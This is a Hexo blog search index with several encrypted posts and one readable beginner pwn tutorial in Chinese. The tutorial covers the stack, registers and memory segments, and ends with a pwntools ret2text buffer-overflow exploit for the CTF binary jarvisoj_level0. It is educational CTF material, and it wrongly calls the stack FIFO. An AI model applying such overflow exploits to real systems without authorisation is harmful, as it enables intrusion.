<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>php反序列化</title>
    <url>/2024/04/03/php%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="1bc4c5a7b83f164ebf03f32bc90f2f6beb70d55773386828e98e4eeb0a107e23"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>php</tag>
        <tag>小结</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn入门</title>
    <url>/2024/04/05/pwn%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p> 二进制安全新手</p>
<span id="more"></span>

<p>函数调用栈是指程序运行时内存一段连续的区域，用来保存函数运行时的状态信息，包括函数参数与局部变量等。称之为“栈”是因为发生函数调用时，调用函数（caller）的状态被保存在栈内，被调用函数（callee）的状态被压入调用栈的栈顶；在函数调用结束时，栈顶的函数（callee）状态被弹出，栈顶恢复到调用函数（caller）的状态。函数调用栈在内存中从高地址向低地址生长，所以栈顶对应的内存地址在压栈时变小，退栈时变大。</p>
<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>CALL 指令：</p>
<p>CALL 指令用于调用一个子程序（或称为过程或函数）。它实现了一种跳转到其他代码块执行的机制，但与 JMP 不同，CALL 在执行跳转之前会将当前指令的下一条指令地址入栈，以便在子程序执行完毕后能够返回到调用点。这为程序的模块化和结构化提供了基础，使得代码更易于理解和维护。</p>
<p>RET 指令：</p>
<p>RET 指令与 CALL 相对应，用于从子程序中返回到调用点。它从栈中弹出之前保存的返回地址，将程序的控制流恢复到调用点，实现了子程序的返回操作。RET 的使用使得程序能够方便地从一个子程序切换回到主程序，完成所需的计算和任务。</p>
<h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>函数状态主要涉及三个寄存器－－esp，ebp，eip。esp 用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。ebp 用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。eip 用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。</p>
<p><strong>栈从高地址向低地址生长，ebp高地址，esp低地址，</strong></p>
<p>rbp 64 位寄存器 ebp 32 位寄存器</p>
<p>由此可见 main函数的返回地址在 rbp+8的地址上</p>
<p>bss段<br>bss段（bss segment）通常是指用来存放程序中未初始化的全局变量的一块内存区域。</p>
<p>bss是英文Block Started by Symbol的简称。</p>
<p>bss段属于静态内存分配。<br>比如</p>
<p>int a;</p>
<p>data段<br>数据段（data segment）通常是指用来存放程序中已初始化的全局变量的一块内存区域。</p>
<p>数据段属于静态内存分配。<br>比如</p>
<p>int a&#x3D; 1<br>text段<br>代码段（code segment&#x2F;text segment）通常是指用来存放程序执行代码的一块内存区域。</p>
<p>这部分区域的大小在程序运行前就已经确定，并且内存区域通常属于只读(某些架构也允许代码段为可写，即允许修改程序)。</p>
<p>在代码段中，也有可能包含一些只读的常数变量，例如字符串常量等。</p>
<p>heap<br>堆是用于存放进程运行中被动态分配的内存段，它的大小并不固定，可动态扩张或缩减。</p>
<p>当进程调用malloc等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）；</p>
<p>当利用free等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）。</p>
<p>stack<br>栈又称堆栈，是用户存放程序临时创建的局部变量，</p>
<p>也就是说我们函数括弧“{}”中定义的变量（但不包括static声明的变量，static意味着在数据段中存放变量）。</p>
<p>除此以外，在函数被调用时，其参数也会被压入发起调用的进程栈中，并且待到调用结束后，函数的返回值也会被存放回栈中。</p>
<p>由于栈的先进先出(FIFO)特点，所以栈特别方便用来保存&#x2F;恢复调用现场。</p>
<p>从这个意义上讲，我们可以把堆栈看成一个寄存、交换临时数据的内存区。</p>
<p>一般般来说，我们会有如下的覆盖需求</p>
<ul>
<li><p><strong>覆盖函数返回地址</strong>，这时候就是直接看 EBP 即可。</p>
</li>
<li><p><strong>覆盖栈上某个变量的内容</strong>，这时候就需要更加精细的计算了。</p>
</li>
<li><p><strong>覆盖 bss 段某个变量的内容</strong>。</p>
</li>
<li><p>根据现实执行情况，覆盖特定的变量或地址的内容。</p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>jarvisoj_level0，可在buuctf网站中下载。首先使用checksec工具查看它开了啥保护措施，基本全关。</p>
<p><img src="https://wiki.wgpsec.org/images/ret2text/1.jpg" alt="1.jpg"></p>
<p>然后我们使用ida查看一下该程序，程序很简单,有明显的栈溢出漏洞和后门函数，后门函数地址就为0x40059A。</p>
<p><img src="https://wiki.wgpsec.org/images/ret2text/2.jpg" alt="2.jpg"></p>
<p><img src="https://wiki.wgpsec.org/images/ret2text/3.jpg" alt="3.jpg"></p>
<p>ida帮我们计算出来了buf字符串距离rbp有0x80个字节，由于rbp本身还占8个字节，所以溢出0x88个字节后将返回地址修改为后门函数的地址exp如下。</p>
<p>手动打断点调试如下</p>
<p><img src="https://s2.loli.net/2024/04/07/W1R2hABJXKDn8fE.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./level0&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27644</span>)</span><br><span class="line">sys_addr = <span class="number">0x40059A</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x88</span>) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a href="https://zhuanlan.zhihu.com/p/25816426">手把手教你栈溢出从入门到放弃（上） - 知乎 (zhihu.com)</a></p>
<p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/">基本 ROP - CTF Wiki (ctf-wiki.org)</a></p>
<p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/</a>)</p>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>php反序列化</title>
    <url>/2024/04/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="106fbd6ee0bed4f99f3e6b04af859aa01fe57b94a6d331b0f4a01eb2765a7e95"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>php</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>php文件包含</title>
    <url>/2024/04/03/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="ca76828221faf2c30d51a4cf519f96e5150163ab43b1b71d86816705e90d257d">6ce8fd968813ca7bce0d20bdfb05381d50dfcb21e57f341672d80ad0359f9348e058597d1615fb979c5e918e2ca4289cdf49f9f58af2b557e0aea1edbef3336419c3279dafdc68f98101b3a83c6b395b50a2304bf68c35f228db3c97aec9461944904b4681aa4df640c2d3500804365577ec29c00209aa1b931dbc436104dc53c0a589ce55794a6ba0af4f098b9388b8d8edfe64fb3c5cbcc1fb5aec2682afc0f68d3e1a4de290b9fc379674a431042528c6173f33e6a8883f468536a5dc8884d045c2cdffd25429fe11b6dfa355e681cd8432ae479acfbebdd4f15e79eab5196e69bc77a9aba42fbafaef22e09eb119e41d0565385d9171a0e6bce6c8813e85f1a2b06eaaab1216334aa010f221ddf095830a1d7202bfa2ef75fe509f9e35a97b03c96717a7ded5c6f7d0b1320641f4049a5be845ac2bdf62daa7372a8d500c2e02fdadc0e1c668bdba69f10655269fcdcf524bf4aa6c816c3219e668cafc252247b413756f7a9c23541c8347331538f83e81104fb4feb16a7f6c934e7b732d0e5ef15584ce713b9a3e35d58cc0bed9cd1260504e126eeacacf900dceab9798de3f22b846576c393bb71b61a806d2a4528c746f766887f3736019e80feb84c863086f7d17f0929e8a4609b272a3f578e8a29693cc427ffabe649895bdbf4b7306977f72a7e75660b9028befd7e32f9a3fbeb6dbbc9462dab55bda6f2a514687829a93b4238ef0975b16678b85cf063a2b877deeb2ab6f928040d39143cb7d0f6f86b9ef7706f1b91a5d7ea2016216cf48c7978a337ec790232f5849154796cb560a95c3fb592b4776e35b188a24d5d6271c47e1b9513b1ef3642dbd04d48ec9f60c94afd1ea7b839297e5207bcfd9ad43595de53622dee4c4cb69088c9f6a4272fe972572716fed2c4e6b4b90bf1bb62e34752e743fea92538591cf6a8fc6f1dfbb78fe77ad6b4609e60bd04ee9a0ef59eb4d70f28ff002aba9066500940ba2be7d7d4e0c6f2c0c80fd3b1cdc6533cb7d53d3bbdf3ea5501eeffe64059d474149ed7b5031fc219c5df57234331e032d4cedd8775c42c67f0cf7cdc78aa3b4a14793a4d9f059891cd568d7821c590be1beddc927c1bdd27d695f0429c37652ff79b85ccd3c45c1462305a77cf80affe0f8482e4f18e81937098a7c793e82f14f20b17a8841a57e4e550d35fd32005bafdcd74e022944ea74097659aafdf67cead2f16875b3672646f1aecbbc905221cfa853263eee55609430733fc3fec7915eec17cf332f887ccbca30bf73587b776c81d319755604c6f9a35bf1d01efd612a6d69ad2bc385541db495d283dbf9db3456115013f81b09798948869d90eb0704b92e2b25140d16fed50562db66767bf2ea97ca6737ebb81494155e20437c2b8a2c950b7a50d1c488d7086d0203167108606d19a87d14c7911377bc8e4784a731a49fe198f3af8dd5fcf9ce54ad4b79a78e4212786628c34b4711049472af8d3ed43335038dc993241e09d78df2b2d6190d217ea02c9150171597c65b557bb52c3fe4ee35980ec340f45d3f28a655fc3e933990383d6767946b9a0bb6066371c881f35cf6819cf37d84cb3a1debc7c91c93d90e639c358e4aad7f345574d903df7e900afe3e4b672712d7830405c93bcace579b465bff6c28c5857e0dbbf4bd01f7c024a96651770b7ffee265accba88cde468ebbc7cfabed7660283b7f01c5bab308de0490071005dc5f34700dfcaf1d53108987d1cdcf423c5c45becdb7f4ecb18b94e9a9a1625fb7085056471bed9d93edaad2e72f5791d96d46c905ea55f55f34c34a8c69b85415c44d049fa839f884826e77bca7e7cb49aa73acb2a7a5efff12083d021dad866704176d2164b00de4c628bc1c3a6a8bd0f90e93b120973e6d47b93d9a84d95e962d4b7938b4d1d896b0330708beee74330d72757b5882fadbdd1b54d720ff6d1462895c10c5d134e335909f0b53015e2bf277405437155018ba6ee11a8447c11938e4c3a90f36fe14d0c0f91f812802fc59f23367d177819da217ab2836c0ca959520c49501ba1c8a10cf870ebffb958069a603fe3e6aa4424cf6f240621efab20f9971910d59218a27332b9acefa380f27fe0676b1efecb562868afe6f9936ee31c67e1e97390906297fd196cdbb00c03f33e26ded906831ad21e5a2c2b92e5485daad38a9d3f69d79dec33c11c4f1afb05ec868092a1a50360027576fcf634f32c055e171e278bde6334a234343e2d203e3a292584d176bf5495a74a05d9434c10af4f84039b5ae44481c7d7474fa4a829cc1a3f3867186e37c069a685a075e35e49bcd8a80a55aa597681e76d4ad66c548e631b0e728a66c77ba4b55e21fb724d13d5a164da9e0446c21b82a43b8ee40c837af303546c62416559c9b68b063e67b6874dd5d54b681288aefb2069d1aba0265918875a99b62e35423ee021c5dbdb6d102334d645d7bedc243e4b33c07621f21fa60acec5efab0064a7c00ca61d1ffcbe3b4efafdf1a3bb49251ed2dd296fdf7bad6dde790acbc36da2c1609323eeba9fe88f60a9f13f56a861d94bec13006f361d4a95590ded392d5e24156ce765b166d099caa7df998205e4d904fafb2e06b52aac1066d467d2daea65791b4e4c3b825b163f9564c6887cb7b553cd1cac6d964b252b9b3d846dc3e5a5b3b2474911476a13c8a604d471d3b95d4826918b247a519623a38133cc5fbe9b8299aea1b33c46e124f3be2a49537512a8e841f362a3a455ef1352cb67a2d2e087d8fd30f401bbcfd4179783fbed0b1087aa99aa1945f72381afd7947290e42de161e699f810a569955bab7d7ce90c38c55306df8e52ec541dfc282ad27b31a2b841a5cd4f1f8dc7db7988930411883d5fee47b34c514d38c2592069bbef67657159944521dfa5ea14843e428bdc032eda8536078a829426bc374c7f988badd99ee7b01b9da8ff083b04380da9c641f4bd7a427ae11a6ea01bfbcc315d624ccb623e8af73d708557f12afc2a01b674d146a0e08ea0d43f6645937949934b74f81166175549e9b298909e9e4e31847e4a582b40a97fabba7c8aa83f4d5d21ee75e39800f0c39cc7a4e18a8ac3881b048f1897a237f74f1a121c507c70dac68c704bc4d9957bc80a3d4d1b21f82510d8d375176d850e31f8e57614906d636f166c7c2e0a4e25fa439b14d516d9344ca9dd6f469c0c6813ce135aa526bee55124d6eca2689cfee3184b07d2c7a8d42a52d7f05732e9745f6beaead8e01234db08af0915c02f0ebb72a59c3526aa8b8e775c7f4467ab176ebff63c3b32bec93db895cc139419d0754150c14016101bf2d271a6bfb0c33249e4748fa86a797176fa30c664a7e6967d16848be944da4d310db4008e4695a7117746a378e8937a05017f894198adbe011d1402e0c96905d3791ca9a781a0953c61ff64e55b0079e6d6e8002c8356634845af52dd6370e2bc777d97080291474c75de86f12df81177fcd83b762ec8f46fbee5b0e00a31417f073451068f287c370a7c341a10d235cececd20ecb2b3a9524085217dce47b11c3269aa72c3821b03a5f3c7c26461f0022fab62251eb24a92d44fd6b39a26769ba6f5d7c44ab6762c233ec772ed693c64a52e042e553bda9576a3dd2d5636d43ed4fb328ffc574fbd5c9f43586d06da71234d8476ba7f3b2b1de6e0653afd524bbf5158d5ecd4f4f2777361a35ad3fcbc1f1004396c1f71be4b228fe21f6a77c202a05a4124e0d327d227ff6a3ef9ef2c0f7a6e5712da6051d968c464fd5d4f17bf4fbc21203e767d110b06f8d3b7d595a1dfa97d8ca65cfef00e7bb5159b13ea0af2467f41c83d3af365c9d6cd8632304168df933de27723a98da5158e1004cd24b4575b26b3aed6deef1289db36d09373d6f384dd4b5f829e6aa48e03f23b2e77f70dab19a110163f737a0f0c397fa07f19c7cbe8485ad920c63633688c9c75d5352b5da5ccb1b883eb7deb39bfbef9978476faf69883448eb76496b128fb0d8085751814c0d65747e5163357bd2632a591645cfefe29dc507aebd5589fbf0ae6da03474d10c6297ac812ee4727d587865751a2e39183f652b58c5971ea6154975cc2900491e30a198db366219960b6a0ffe4b63069bb778fd7f0afb95a4a7e2df7061bb2bf752e1a3bb37cd3ffc4d0592853d21d7bb5be5ce366512b345cc86b15d68388fc6109ce63a7a2a93e067f9af1a0249b2481a8793997a68803630c4e036ca8723b3b393d96b3403acf3df2e662d2496bedb5d00ded1ec0f23991fd5125b43e599246b4ddabbaea0f9923f1f53361d8d76b79296d3a6f259781ee284edded4825948fd609d708a9e3d4fa14bdec13f51e8f58e1511069a7b7ff8e80b8d4ca541e9645b0358cc4dad1e0a04e562af9c7bf8ed676fca5626c8bf2a95e45e3b9ede80b5f0c1c534c6c66908b52beb641c64fbfbb2c6336978649936dd31e49d692788283f74ad9211a06ccaad50861d8b9f210c472ea5007ea96f0e2937678bda530212042ec10ab90f1484225a985ca8ed2e8b73b55983af8e11a48560d7ab794cbd1412a79c2a1b22f7e5662b089a935ab37a70498611fd4f570dffb78b5a0c4b5774d313fe6e7bdcad3693333d4e84d155e2bd289b4359a16ae3b154ec9f84d6fde9d9452d692e9ec1763f15b93c626dcf97041e8df6f9636ba5c31f7ae9d35df47ad571a6b680d045ec7b2fa7b0a6b566bb2819a70db1ddcd55624646404741f5ec8b50e03d0943fb9579bbec2582fbd9f96a040fd2758c1b2e4cf7ca569a55fa0349cace84d52c4a8c8435671238a54ce2e48a81bc80eb8884df8213547452813dd844a1f6a5c43334f379585132e7a13d7fe29bbfacda3c97d85ebe10a5fc198d389a4b8bc0b19080437bdf8b008e027c6fe78e30cbf284339f6f840f5b425a0bb6aecf06b32b9485c11e2ccde60e2bc2fd82913b8c13b687a547c40376dc9f2b77210bddbb5cc767163f7ea6c280ca346a74f4664e469e4bf4a889d7f08177d3f094550cee30a1b114804e167a95e9a2b4e0e2716cc600f116bc56a138255632e3c506004a241e5ee23d481e145b1fa1b916d6f709d4048be30d55e9c31a8b3a54aed8b833f0ff5749610d7ee5fe51b4208da7163d645f6d321808947a6e8bedd1e7c6e1d2568c2050de7d9c2bfcf43c19b2df44d9004e9869b60e0ae6f2843195fd52a2ffbcbf1a3e5632a648487160a8bdbedf073e151eba66c23c4814347bab0fec835824d04259ca7e89b5c53a11366995f1114e06f79d18a19b91b7c93e2f8c65f0fa695a63a77d353309aa7b2d5a72f6eb7fd7cbbf756b121e877c124c0c2e8b0546436e201838621fcdc1b19ffde0901ad483c28b5a1861a65255fd1cb9b5bb342f94948b888cb4ca6b14c9c3312f2adf9f60f22ab90da8d9c8844f9d54b4b9446faa5fe24d3acb71f6ef205aa84e842e9ee2d27f857400a7a000547585295ded0eeb384c3957ef1cdf518e1c49b4baa42bd17ab25b71129d1598c34f8d97a3f5adc38b3994d41b513f9d64935c65064c2265f775527631d2b2eff01d8f792b7e10571e046a768048ee3e9ea0245801ffefa4fbac67d07b7be3ad6fc2bda6b0a5928b623cff6d671c3f814303f46ac6e7fc88d09b9aa60acfb124ebe025bda2af9f8ca7164ab52ca673195839846093fac9449f3cd0d69e0c2cc3f6651bd18c4fcb541647d86c20367e0d75fb499127d734b69a55476f8a5e77df51272452f6c2f43508d094ad3049b4b0de5f621cb818289a40b1ae1e463de85dc1f983d13d1a5ff1e9c259a1e93c91207a47c6bb369e3c224c91769ad9d727ca92c0f4ebb3b5017e3b8390b9a84566d879aba6f29cc10bb7000df936aab7c72c46f91d98d507703bc70dd55a7bfa6f030a2a532ead575921d0964bbb9e52c479d956fd1ee72e70f1d74eac4a6eec735849f85a68f3268eea6961a53ba94ba2ccd20a76c606bff97e9749fee5376b122c3f97828f36f01bc8d157ac64f834c19b760dc03f63af3719e0ce46fc57bd15a736b78359545710d494d499c35cf50885b06a9c64cd3232eff1cf6488452a02e7a671eb3b484bb6a4032ef2f0ca55cb44b94648370df7328b8960e19d580fe2ba9f8f0327662aaa5e36669c2faa18c3bd3a44ec6aa7c6845ee8a2ea8b2331e3a3daf2e278a94557e363c70c8b292948f9d19452819087fcd3c736c632cd302e38fc68946c52899742a0d184e46b208483c48f814f8e102657826b25bf03e18f5dc0ad676148cd5106c3d7fafc9bf53773bab092f14e2d864254583c7dc9c51bf1286fff64a90c845d9648b16da402955a6f8f63a94a4a76eca945edd5a1e833425bd2a34847103592830c17605dde8dbaf7f2c112a8aa7030a2a5508d55116916f796d7d5ab44dc881a959b12d35e8ee6c9007d6ce1261b7a02a3c98993507261b78b7706efa6de07e7fbe0cc86b74c7f5c2096400f052636ce6088464ff0ee40fc23df2d4651c44e8b2c8e7ddf2b96030426ab458df4c29d2eeaa71277b6a5e91706dcf34d7f0f580636b89ff1fdc66f9ab260a113d728e70c08bed1adf92b8dd12d6d6625947043c99cc02d153859b026f26e5e391acf7b9faade052d979b82b81a8260cfa52e0cfb7652f3a7b0132d085889e80e9924fe03ece2da4a28bdca4d6d40e2f3fb8e45931973f2fb7ea8517122d85ecaa4158a5433f4fffc24e6d293e785ecc4d9fd41fb5c7d671e737629717ad872517595d27f6e9464c2fd6adc6c5f93a2e709166ca00d254fb8a4370488e53acca9a64656d613c11053d8137c5d28dc1ae6661c65fdb8572a89ffbaaacb37ac88c29d7f03029f3fc779ee0a6bf2d69a87bec139cee7b457e535f0d22a17116cb6d473df4eb6bff1a8fd42c172a72762f351dedc30a7a27bf04f18f08e9f658168f4dd23b3f9bf5cb931a28f8e4617009c4cb86233bc42ac4a2c75db5d90a340a5f27425d25e61f786820d2c15b5bca9ce2535cb7373c89a18c64828a7cc43113607f0ae7f9a6324c6f642bebb9ac38f53c1c36d66706788bbc1fab697ecb5be4a6ec55026f524ca30a075ce4df646a16ec6fb98e4236cd9a31bb58d0c9eb8adf109b2d423625b67e509a5a2c62dc71c4759245b8e7eb10c1955b74115b65f31e3eba98a3b042e8e78b5ee810c7d77a82aac67abac394748a6c1ec39389ad0205a49c855929144bcd7d552b45103c9f327b66ea0854975e0b0f277bb55e873305e482ac34c5e098a6549d60e5abe47747a7d6d26d19d65d4cbb7455b1aee90dfb634f17e28d0992f39f7dc83b7db81adf45fd1fc9b1a522f9fdc03df903a1daeda2269df69577635ce112a63b7759bee07bd1350fd2d727bbb2bdbcb565b603452159f6e25a0950053eb1957f2e60f535adc001a413287e49383f4a3b06bdb1c3822669062cf114acb73a5ff5137f3d5dc568bb8c3bafd4ba8e1f094bd5a20e0a55737acaef760ea10de451d232030fcd6db398d0b7f49985a380c436b0e13ffb06164a6766934b626dfc1dd738c46c81de68ad1fef4cd8f2396473280c8f83566e5ca3c25afc5064bd6abc3c60012d6f89007ef89d8f81312f15b7b940a59e39ca1d2b0f820743db51daf6e3dd21bb856121e56a6f9831b46553b14e167445d2f15e5e6db9564fc3e185e9becc39ec8f180648cb28878ba2466fda73bd922e8c03dfe76fb4ccbd9c2baca5c259a1bbf7ec8f6f664f601de0ffea7042e5a1501eb5622246b4ce8ab5d97ccf1e39ebec8e78ee1c586114c05426c0706d2c55f8069d416d03003aef2d273d7b8466958cf36c7e8a5bf08f7bc4e6b1502fb1e63066534d0121cc94b94e6d67769e73360fa3c573af0c73523874d7813e89081ecbf0a1bdc17485be8575d9cc9e7b7f5bfebca016a76e65f820995e6c7604ed8219ed54b5e836a87e5bbbfa2eb3300c1a4f2bb03a8be41404e20f5e11d9cbfc4758118749d194d478518d47fc3402bc38e4c45de7946c8103c2a17106395f9edb39a3d0302f922e41ac363232a05630ea548eb9eb5f281283ec7bc76c215a2126aba5e31f0a447e9748500cce6315ccd20762a6c11eb20f519977028b63b4aacbb226d4e35905c881a16fd0095d089961bb5e628c370f8f40d012d968d6000c6c1354131640ecd60b1fbffd650f67b59eb3a6a799d07bd2c515b08a7853cf7dfd1198901f77491dde1f8f0e7d3c79f82f37ce2893a07af5ed8e621b5373be064cc8f55d4eefb70b319f70ec907d61adae5f4481963a7feef6498705f83658d0f72d4c16b2b1b3d3e7b7b7489308860162dc3325957704230c920347b257846927c99d52d9783403d367b48627032a83368677e5ce4f18a231867cbd4815d756c572faba83be47d07e4b11a1be0ce85a78ce46a704803a75792e01b0587bb74dd381b0b2f843a24ea9e11735d1db6a91fc90bb371efc11c8fe9aa889b3f620919628d4291068e156074ffbb3d198cd089f6bc7f1530e57f440c1bdc72b431d9ddb1374d397cbdc5de61c0482efb67767cc06ff0cd8e0a768547181ab85e7cf7898de817ce53b6fa33fa79ba32daa0c4162e778924c5dc091be95a570e297eb5722987804fbc256da98328e7fc30705dd3a3c821ba7cddacefadbf814e371d74e578ef3969c100817968463f2c66a91558a4b200b8cdd9a98816f26ee5e3cbe52d16ea5ccfb02c5700f5e63f1c05f4e384195de955c916a85292464d781efe374ddba4326153aa4d3d36278e390f9c95ac1d75d6bd8bc04f76f924b73f1c2a3e80886217cbfacf2009cbfb251a34323627d8a37e16b2d47db32ab5e3fa7464562f03fe0a11f201be65904233cc73805083ea3b8816ef025e01d2f8d43ac251e0b0e9f5ea31abf81857ca86a3ec7aba6b447df42233171b78a3d9ac99da9afb48d546b6b3c108a3e4cd2af0add2a8731c919e4eed9c384ee313cabfa319226bcfc127c540cb51b1b7f837cdca57cffbd934e588c0f603723e8bc20170cff8559154cb7304d72a4aa4e731af3f33f68af4b614652ca368015192626894bd7ee9a5efb834578952c04e2e6915e83d978f0d54db57e9f92c4023b5932d8556d1fbb55c4046e7a483219d40a98ff77966a5ed265258b6cb5732475a6ef91bf347f64e801c713ce26c7fd29d63e91f11b5bb36d0674ae5807898b33e3e82dd214e297e972c0e44a405bb4cff84ce1cdfb7e81de912844b42639f2b95a3c32d9cfce2061644241234aaae9ebd89a89a7940e6063b29fc63335e1dc6a02ad6c9af622397031cc87b2d959fedd81c0695c70bb9e194fe8bf6522e93209b4f9ec04f8136bc95f217d79ca26278f083d7695609e97f9555cd6f25fb8407c725f4a9ebf919157db76921f13849a44272f4b7e62a8ed13c33c9d88fff7558d04f5360c8bd7870035ee9eb47962a933a5cbdf2d5859d7d103a65768fb183810e75477def6cc7a1c5313d35a39e3c8e0c7ce19cd12488a278ee7d1c4768aa938e88e89f24bc628c7214f532b87a6dac51e400d5b8cb3ed862368d093249061296f030303b2d53ae372828ee2944875eb801ab2819a1bb745105e0a43334c8a4f98e1aa31b959a66772c0542ac4009ed8f2b794cb495091013631489faf266c20486608378c335ebd6f37cc8cb7edc42232a684e828f898dbef624074eb528cc97b2687405b9c88390ccc1e281d5d259c182be1d57c4ae202363a2802724edf1ab78d3c4af7875dde7b00ad7ff8fdcbc251b573f175661cbd99dc24bf12d97403840eadd582b92fb80c597b3cb5db6240daf3b89f1435628a5e8a3009b6f8efb2028481a84f73e6859b98c900dcbe81724d263547fc791a78b49aba9a99e1e36c2103d47c9b211e3860d17ab268b1304efd0bc4b8aaa19cef5a4326415cc8b20c9d0e1cea0ad516bf18ec0b52b17fe692172f4213530898485979a931db6cadb3a4f4770ce925547d5265ee9698e51d326eff3086297e36d260b12998f6c5342de62575ccd8920be0129563f15aeef9ec35cd741629dcad668c3434efee6858c884eb4b39b53755d9894288175716d601e84340022345ade74ea5be2771760102f010e17520d0f9b5db9dc7d8b143e30809894747d85ff54a51eacdae899ffd045dfb0412eca28d5079f3f1cc1d4df61c4c79558110d94ebbff9c3299325bf58a9e77d7584f9b93cb259d48dc760ebf360d28d6b1679f2d902c659bd293658c4da31433075589ae2c49e192cc1fb66b1d24a3200555662e6493d591ec7ce84887b785ace5c5d3c3f1313759098a43b1c8eda344e73d912440ebaf076e42f63dd14291a2b037d93854282822ae65de221f80fa51cfc9a82c41f28a52da70e76087a43a41b38c31eb127630986d9e898cd7488f6bd5c4bd8c7123d482aa0fc8491ee0da36e7c17ab5b850c414787dc11b40f99d67a42ba2b70db1857170a85ba1ad65199f16cd5b65ecaebd8f5ca12bc59f53dce7f2a500c937838cfc958ecdd0ea21996a63df74a3aefe6e0504f1297628b6af511a815e31d57c727ae7acc806164c3f6f443d4823cefbdee6c957cb2be2dc28c5fc1fbe59ebd33b940914090ca8b22d071dfa5b5b0a013464a32ee1a374eadbf15c7d36fe6b8626fad496917849aa001dbed6db0a62bf90913c45ae62b42e6c9b3d4e3f0d89da90307f6abc172608268214781a5dce43fde16262c01cb244cd4729ccec753f160b912f9aab11b23de778b9c811ff96dff144e06fb43ef9c1418c23552205ec00b3662774f16aa647788801b85834729ce8d3f77da293f7164458b35c10b04824daa3007bf32fb5031dd9f654229edd551cadcc909eee185ad326ae7c80d1fc15f0728cf2b92e211fd0c8aa38f5d5ec1aa53a54d60c46190f0d966d7ce0aa35c921fd6cf65b024c904fc97c591fa916cd37646a431c4c1e0cbc0b4cb336bee098f5999672a6ae14389dfd0cbb59ae9c6f6af8983494d24139bce1706ab38deca6e383f6f991f0582989cdd5b67b4885fc3c28066c67560383b41fcbc7003afdc648f1d4dff17c9ad584807954521dda56350a1b99a8ec0dfd66c7d0b5b156eae0e781d96c4f479471b58f7de8b782f1fbbfa35a5cca0ddffcdeadec46c75c4cf8693c8890c76c0a5099e0386333ef193a74aa53c43ecd59e986b8aa014754b1b693c77acc15a50ae78cc7b5fa30bce2d6121665a2dc287e4063d48d6568782b6ea630ebb4729c1c798c5ec08b9b81b1b9116d0a61b3eb879204e830735e26cf8a825ac729af788b47b4e7a47719a056b169ee3a713216a8ef73fc0264f14e4217950db89516bdf00bcec9e315ae76f8a1a093d7e33639be9bbe66b098ef36182c582c74c660b4171fb32a9693cb6f70ab4936bf7789184ccd111a5862ac9f34fa98ce168c013823c00123dcef8e714e90f9faa1501596cfffe077ba6bb29b8f172141c88a894e832f124f9d8c4fc095777ff6550ae0985ef89a61e4f61cefc415466d26c8af41f7231ba555d6b4905d9052bd36f8ff268e861f7e005e28f944f20838782a54bac7e190f41e405f2b0101717685494e57127e521442c47a06f6d1a20500b578b71cda652d630a9d3fa1a38ef642495816fc7bf06448b25138b9b55d25b5da584c230c8fa57a37027551df6788ce52aba08d54f37699f6e08c7eda041acb8e7d2da1fa1eaba3cd4992fba6db4b7913ded3d0126c236a4e9fecf5e9734618b76a3c948919b0dc494b887fd366767e965d